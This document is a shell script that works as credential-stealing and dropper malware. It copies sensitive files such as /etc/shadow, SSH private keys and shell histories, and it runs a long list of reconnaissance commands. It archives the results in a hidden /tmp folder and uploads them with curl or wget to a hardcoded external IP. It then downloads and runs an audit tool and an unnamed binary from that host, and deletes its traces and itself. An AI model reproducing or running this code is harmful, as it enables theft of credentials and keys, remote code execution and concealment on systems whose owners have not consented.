#!/bin/sh

print()
{
	echo $*
}

filelst='/etc/rc.local
/etc/hosts.deny
/etc/bashrc
/etc/issue
/etc/issus.net
/etc/passwd
/etc/group
/etc/shadow
/etc/gshadow
/etc/profile
/etc/login.defs
/etc/redhat-release
/etc/resolv.conf
/etc/crontab
/etc/securetty
/etc/security/limits.conf
/etc/network/interfaces
/etc/sysconfig/network
/etc/hostname
/etc/sysconfig/iptables
~/.bash_history
~/.nano_history
~/.mysql_history
~/.profile
~/.bashrc
~/.ssh/authorized_keys
~/.ssh/id_rsa.pub
~/.ssh/id_rsa",
~/.ssh/id_dsa.pub
~/.ssh/id_dsa
/root/.bash_history
/root/.nano_history
/root/.mysql_history
/root/.profile
/root/.bashrc
/root/.ssh/authorized_keys
/root/.ssh/id_rsa.pub
/root/.ssh/id_rsa
/root/.ssh/id_dsa.pub
/root/.ssh/id_dsa
/etc/ssh/sshd_config
/etc/ssh/ssh_host_key.pub
/etc/ssh/ssh_host_key
/etc/my.cnf
/etc/mysql/my.cnf
/etc/vsftpd.conf
/etc/snmp/snmpd.conf
/etc/postfix/main.cf
/etc/samba/smb.conf
/etc/yp.conf
/etc/hosts
/etc/vsftpd.user
/etc/vsftpd.user_list
/etc/vsftpd.chroot_list
/etc/ssh/sshd_config
/etc/ssh2/sshd2_config
/etc/krb5.conf
/usr/local/var/krb5kdc/kdc.conf
/etc/exports
/etc/named.conf
/etc/sendmail.cf
/etc/snmp/snmpd.conf
/etc/ftpusers
/etc/postfix/main.cf
/etc/dfs/dfstab
/etc/rmmount.conf
/etc/dovecot.conf
/etc/named.conf
/etc/aliases
/root/.ssh/known_hosts
~/.ssh/known_host
/etc/fstab
/proc/cpuinfo
/proc/ioports
/proc/meminfo
/proc/partitions
/proc/pci
/proc/swaps
/proc/version
/etc/pam.conf
/etc/host.conf
/etc/hosts.allow
/etc/hosts.deny
/etc/nsswitch.conf
/etc/security/user
/etc/inetd.conf
/etc/xinetd.conf
/etc/syslog.conf
/proc/sys/net/ipv4/icmp_echo_ignore_all
/proc/sys/net/ipv4/tcp_syncookies
/etc/sysctl.conf
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/etc/motd
/etc/hosts.equiv
/.rhosts
/etc/lilo.conf
/etc/grub.conf
/etc/grub.cfg
/etc/inittab
/etc/rc.config.d/netconf
/var/adm/inetd.sec
netstat -anf 
netstat -p tcp 
/etc/mail/aliases
/etc/default/passwd
/etc/default/login
/usr/sadm/defadduser
/.login
/etc/.login
/.cshrc
/etc/skel/local.cshrc
/etc/skel/local.login
/etc/skel/local.profile
/.profile
/usr/sbin/in.routed
/etc/environment
/etc/security/login.cfg
/etc/system
/etc/notrouter
/etc/cron.d/logchecker
/etc/default/telnetd
/etc/default/ftpd
/etc/hosts.equiv
/etc/default/sys-suspend
/etc/rc.tcpip
/etc/default/kbd
/tmp/.PATH'

cmdlst='id
eeprom
uptime
ypcat passwd
who /etc/security/failedlogin
ypcat group
ypcat hosts
/usr/sbin/no -a
ypcat inetd.conf
ypcat services
hostname
ls -R -al /var/log
usrck -y ALL
grpck -y ALL
pwdck -y ALL
domainname
uname -a
ifconfig -a
netstat -aultpn
ls -al /etc/rc.d/rc0.d/*
ls -al /etc/rc.d/rc1.d/*
ls -al /etc/rc.d/rc2.d/*
ls -al /etc/rc.d/rc3.d/*
ls -al /etc/rc.d/rc4.d/*
ls -al /etc/rc.d/rc5.d/*
ls -al /etc/rc.d/rc6.d/*
ls -al /etc/rc.d/init.d/*
ls -la /etc/pam.d/*
ls -al /etc/xinetd.d/*
chkconfig --list
netstat -s
netstat -i
netstat -M
alog -o -t boot
netstat -np
rpcinfo -p
lsof -i -n -l -P
ypwhich
ls -al /
ls -al /var
ls -al /var/adm
ls -al /bin/su
crontab -l
find /var/spool/cron -type f
find /etc/cron* -type f
ls -la /etc/rc.config.d/*
ps -elf
pstree
swlist -l product "PH??_*"
swlist
lanscan
dmesg
showrev -a
pkginfo
showrev -p
psrinfo -v
prtconf
isainfo -b
isainfo -kv
ls -al /etc/rc0.d/*
ls -al /etc/rc1.d/*
ls -al /etc/rc2.d/*
ls -al /etc/rc3.d/*
ls -al /etc/rcS.d/*
/usr/sbin/modinfo
/usr/bin/oslevel
who -r'

setUser()
{
	local tmpfile="/etc/notexistfile"
	echo 'test' > $tmpfile
	cat $tmpfile > /dev/null
	if [ "$?" -eq 0 ]; then
		USER='root'
		rm -f $tmpfile
	else
		USER='notroot'
	fi
	print "[+] User: $USER"
}

setHostname()
{
	HOSTNAME=`hostname`
	print "[+] Hostname: $HOSTNAME"
}

preparefile()
{
	print "[+] Prepare file"
	mkdir $CHROOT -p
	local IFS='
'
	for cfile in $filelst 
	#while read -r cfile
	do
		cfile=`echo $cfile | sed "s#\~#$HOME#g"`
		DIRNAME=`dirname $cfile`
		DSTNAME=$CHROOT$DIRNAME
		mkdir $CHROOT$DIRNAME -p 
		cp $cfile $CHROOT$DIRNAME -v &> /dev/null
	done
}

preparecmdresult()
{
	print "[+] Prepare cmd result"
	mkdir /tmp/.abcdefghijklmn/ -p
	local IFS='
'
	for ccmd in $cmdlst
	do
		echo "Result for command: $ccmd" >> /tmp/.abcdefghijklmn/cmdresult
		#sleep 0.1
		sh -c "$ccmd" >> /tmp/.abcdefghijklmn/cmdresult 2>&1
		#sleep 0.1
		echo "--------------------------" >> /tmp/.abcdefghijklmn/cmdresult
		#sleep 0.1
	done
}

tarfile()
{
	print '[+] Tar files'
	tar cf /tmp/.abcdefghijklmn/t.tar /tmp/.abcdefghijklmn/cmdresult $CHROOT &> /dev/null
}

sendfile()
{
	# Wget 1.9, released October 2003, included experimental IPv6 support, and ability to POST data to HTTP servers.
	local URI="https://$HOST$URL?os=$OS&hostname=$HOSTNAME&msg=$MSG&user=$USER"
	cmd1="curl $URI --data-binary @$1 -k "
	cmd2="wget $URI --post-file=$1 -O /dev/null --no-check-certificate"
	$cmd1 || $cmd2
}

main()
{
	HOST="218.213.77.197"
	#HOST="127.0.0.1"
	URL="/index.php"
	OS="linux"
	CHROOT='/tmp/.abcdefghijklmn/files'
	if [ $# -eq 1 ]; then
		print "[+] Sending Msg: $1"
		MSG=$1
	fi

	print '[+] Setting user'
	setUser
	print '[+] Setting Hostname'
	setHostname
	preparefile
	preparecmdresult
	tarfile 
	print '[+] Sending file'
	sendfile /tmp/.abcdefghijklmn/t.tar
	
	wget -O /tmp/.abcdefghijklmn/lynis.tar --no-check-certificate https://218.213.77.197/lynis.tar || curl -k -o /tmp/.abcdefghijklmn/lynis.tar https://218.213.77.197/lynis.tar;
	cd /tmp/.abcdefghijklmn
	tar -xf lynis.tar
	cd lynis
	./lynis audit system
	sendfile /tmp/.abcdefghijklmn/lynis.log
	
	wget -O /tmp/.abcdefghijklmn/.dnler --no-check-certificate https://218.213.77.197/dnler || curl -k -o /tmp/.abcdefghijklmn/.dnler https://218.213.77.197/dnler
	chmod +x /tmp/.abcdefghijklmn/.dnler
	/tmp/.abcdefghijklmn/.dnler

	print '[+] Removing files'
	rm -rf /tmp/.abcdefghijklmn
	print '[+] Removing self'
	rm -rf /tmp/.e.sh
}

main $* &

